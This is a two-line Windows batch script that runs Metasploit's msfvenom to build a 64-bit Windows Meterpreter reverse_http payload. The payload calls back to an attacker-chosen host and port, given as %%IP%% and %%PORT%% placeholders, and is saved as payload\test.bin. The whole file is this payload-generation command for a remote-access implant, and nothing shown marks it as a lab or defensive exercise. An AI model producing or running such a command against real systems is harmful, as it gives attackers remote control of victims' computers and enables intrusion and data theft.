@echo off
C:\metasploit-framework\bin\msfvenom.bat -p windows/x64/meterpreter/reverse_http LHOST=%%IP%% LPORT=%%PORT%% EXITFUNC=thread -o payload\test.bin --arch x64 --platform windows